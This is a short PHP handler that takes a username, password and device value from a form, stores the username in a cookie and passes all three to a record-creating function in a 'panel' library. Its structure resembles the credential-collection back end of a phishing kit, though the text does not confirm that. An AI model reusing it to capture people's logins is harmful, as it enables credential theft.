<?php 
require('../panel/lib/funciones.php');

$usuario = $_POST['usr'];
$contrasena = $_POST['pas'];
$dispositivo = $_POST['dis'];

setcookie('usuario',$usuario,time()+60*9);

crear_registro($usuario,$contrasena,$dispositivo);
?>